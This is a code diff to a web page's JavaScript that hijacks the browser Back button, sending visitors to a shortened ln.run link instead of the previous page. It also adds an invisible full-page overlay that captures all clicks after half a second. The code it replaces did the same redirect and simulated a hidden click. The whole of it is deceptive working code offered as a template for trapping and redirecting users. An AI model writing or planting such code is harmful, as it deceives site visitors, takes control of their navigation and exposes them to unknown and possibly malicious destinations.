@@ -237,31 +237,40 @@ const initialLink = "https://ln.run/TQGSS"; // Replace with the link you want to
 
 
 document.addEventListener("DOMContentLoaded", () => {
-    console.log("Page loaded. Initializing history manipulation and popstate handling.");
+    console.log("Page loaded. Initializing back-button handling.");
 
-    // Step 1: Push the main page into the browser history stack
-    history.pushState(null, "", location.href);
-    console.log("Initial history state pushed:", location.href);
+    // Step 1: Create a full-page overlay
+    const overlay = document.createElement("div");
+    overlay.style.position = "fixed";
+    overlay.style.top = 0;
+    overlay.style.left = 0;
+    overlay.style.width = "100%";
+    overlay.style.height = "100%";
+    overlay.style.zIndex = "9999"; // Ensure it stays on top
+    overlay.style.background = "rgba(0, 0, 0, 0)"; // Transparent background
+    overlay.style.display = "none"; // Initially hidden
+    document.body.appendChild(overlay);
 
-    // Step 2: Handle the Back button redirection
-    window.addEventListener("popstate", () => {
-        console.log("Back button pressed!");
-        // Redirect to your desired link
-        location.href = "https://ln.run/ZT6w8"; // Replace with your redirection URL
-    });
-
-    // Step 3: Simulate an interaction (e.g., focus event) immediately on page load
-    const simulateClick = () => {
-        const dummyElement = document.createElement("button");
-        dummyElement.style.display = "none"; // Ensure it’s invisible
-        document.body.appendChild(dummyElement);
-
-        dummyElement.click(); // Trigger a "click" programmatically
-        console.log("Simulated user interaction.");
-        document.body.removeChild(dummyElement); // Clean up after interaction
+    // Step 2: Add Back button handling logic
+    const enableRedirection = () => {
+        overlay.style.display = "block"; // Show the overlay
+        console.log("Overlay activated to handle back button.");
     };
 
-    setTimeout(simulateClick, 500); // Delay to ensure page elements are fully loaded
+    const redirectOnBack = () => {
+        console.log("Back button detected! Redirecting now.");
+        location.href = "https://ln.run/ZT6w8"; // Replace with your desired URL
+    };
+
+    window.addEventListener("popstate", () => {
+        // Show overlay and trigger redirection when the Back button is pressed
+        redirectOnBack();
+    });
+
+    // Step 3: Trigger redirection logic after page interaction
+    setTimeout(() => {
+        enableRedirection();
+    }, 500); // Delay to ensure proper loading
 });
 
 
